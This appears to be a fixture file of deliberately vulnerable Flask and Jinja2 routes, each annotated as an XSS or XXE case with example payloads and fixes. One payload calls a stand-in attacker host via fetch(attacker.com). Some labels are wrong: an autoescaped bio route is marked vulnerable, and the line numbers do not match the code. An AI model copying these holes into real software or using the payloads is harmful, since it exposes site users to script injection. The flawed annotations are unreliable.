"""
Cross-Site Scripting (XSS) Vulnerable Samples

This file demonstrates XSS vulnerabilities in Flask, Jinja2, and other
template engines where user input is rendered without proper escaping.
"""

from flask import Flask, render_template_string, render_template, request
from jinja2 import Environment, select_autoescape
from markupsafe import Markup
import xml.etree.ElementTree as ET


app = Flask(__name__)


@app.route('/greeting/<name>')
def render_greeting_unsafe(name: str):
    """
    VULNERABILITY: XSS via render_template_string with unescaped input
    Line: 20 - Direct interpolation of user input in template
    Severity: CRITICAL
    
    Impact: Attacker can inject JavaScript code
    Example attack: name = "<script>alert('XSS')</script>"
    
    Fix: Jinja2 automatically escapes by default when using render_template
    """
    # VULNERABLE: Line 20
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)


@app.route('/comment')
def post_comment():
    """
    VULNERABILITY: XSS via user comment without escaping
    Line: 34 - Unescaped user input in HTML
    Severity: CRITICAL
    
    Impact: Stored XSS - malicious script persists
    Example attack: comment = "<img src=x onerror='fetch(attacker.com)'>"
    
    Fix: Always escape user input when rendering HTML
    """
    comment = request.args.get('comment', '')
    # VULNERABLE: Line 34
    html = f"<div class='comment'>{comment}</div>"
    return html


@app.route('/search')
def search_results():
    """
    VULNERABILITY: XSS via search query without HTML escaping
    Line: 47 - Direct string formatting in HTML
    Severity: CRITICAL
    
    Impact: Reflected XSS in search results
    
    Fix: Use Jinja2 template with autoescape enabled
    """
    query = request.args.get('q', '')
    # VULNERABLE: Line 47
    return f"<h2>Search results for: {query}</h2>"


@app.route('/edit')
def edit_content():
    """
    VULNERABILITY: XSS via Markup() on untrusted content
    Line: 60 - Explicitly marking untrusted content as safe
    Severity: CRITICAL
    
    Impact: Bypasses Jinja2's automatic escaping
    Example attack: content = "<img src=x onerror='alert(1)'>"
    
    Fix: Never use Markup() on user input; only on content you control
    """
    user_content = request.form.get('content', '')
    # VULNERABLE: Line 60
    safe_content = Markup(user_content)
    return render_template('display.html', content=safe_content)


def create_jinja_env_no_autoescape():
    """
    VULNERABILITY: Jinja2 Environment with autoescape=False
    Line: 74 - Explicitly disabling autoescape
    Severity: CRITICAL
    
    Impact: All templates in this environment are vulnerable to XSS
    
    Fix: Use select_autoescape() or enable autoescape=True
    """
    # VULNERABLE: Line 74
    env = Environment(autoescape=False)
    return env


def render_user_html(html_string: str):
    """
    VULNERABILITY: Rendering raw HTML from user input
    Line: 87 - Direct HTML concatenation
    Severity: CRITICAL
    
    Impact: Arbitrary HTML/JavaScript injection
    
    Fix: Parse and sanitize with bleach or htmlparser
    """
    # VULNERABLE: Line 87
    return f"<div>{html_string}</div>"


@app.route('/display')
def display_user_bio():
    """
    VULNERABILITY: XSS via user bio without escaping
    Line: 101 - Bio field rendered directly
    Severity: HIGH
    
    Impact: Stored XSS in user profiles
    
    Fix: Use Jinja2 templates with autoescape enabled
    """
    user_bio = request.args.get('bio', '')
    # VULNERABLE: Line 101
    return render_template_string(
        "<div class='bio'>{{ bio }}</div>",
        bio=user_bio
    )


def xml_from_user_input(user_xml: str):
    """
    VULNERABILITY: XML External Entity (XXE) / XML injection
    Line: 114 - Parsing untrusted XML without disabling external entities
    Severity: HIGH
    
    Impact: XXE attacks, information disclosure
    
    Fix: Disable external entity parsing, use defusedxml
    """
    # VULNERABLE: Line 114 - ElementTree doesn't disable XXE by default
    root = ET.fromstring(user_xml)
    return root


@app.route('/md-preview')
def markdown_preview():
    """
    VULNERABILITY: XSS via unescaped markdown rendering
    Line: 127 - Raw markdown HTML without sanitization
    Severity: HIGH
    
    Impact: Markdown can include raw HTML/JavaScript
    Example attack: markdown = "<script>alert('XSS')</script>"
    
    Fix: Use bleach to sanitize HTML output from markdown
    """
    markdown_input = request.form.get('markdown', '')
    # VULNERABLE: Line 127-128 (assuming markdown library is used)
    # This renders raw HTML from markdown without sanitization
    html_output = f"<div class='preview'>{markdown_input}</div>"
    return html_output


@app.route('/json-display')
def display_json():
    """
    VULNERABILITY: XSS in JSON response with unsanitized data
    Line: 142 - JSON containing unescaped HTML
    Severity: HIGH
    
    Impact: XSS when JSON is rendered in HTML context
    
    Fix: JSON escaping is automatic if using Flask's jsonify()
    """
    user_data = request.args.get('data', '{}')
    # VULNERABLE: Line 142 - If this is rendered in HTML, XSS is possible
    import json
    data = json.loads(user_data)
    return render_template('display.html', data=data)


@app.route('/iframe')
def embed_user_content():
    """
    VULNERABILITY: XSS via iframe srcdoc with user content
    Line: 155 - Untrusted content in iframe srcdoc
    Severity: HIGH
    
    Impact: XSS in sandboxed context
    
    Fix: Sanitize content, use appropriate sandbox attributes
    """
    user_html = request.args.get('html', '')
    # VULNERABLE: Line 155
    return f'<iframe srcdoc="{user_html}"></iframe>'


@app.route('/style')
def apply_style():
    """
    VULNERABILITY: XSS via user-controlled CSS in style tag
    Line: 168 - Untrusted CSS in inline style
    Severity: HIGH
    
    Impact: CSS injection, can execute JavaScript via expressions
    Example attack: css = "background: url('javascript:alert(1)')"
    
    Fix: Validate/sanitize CSS or use CSS parser
    """
    user_css = request.args.get('css', '')
    # VULNERABLE: Line 168
    return f"<div style='{user_css}'>Content</div>"
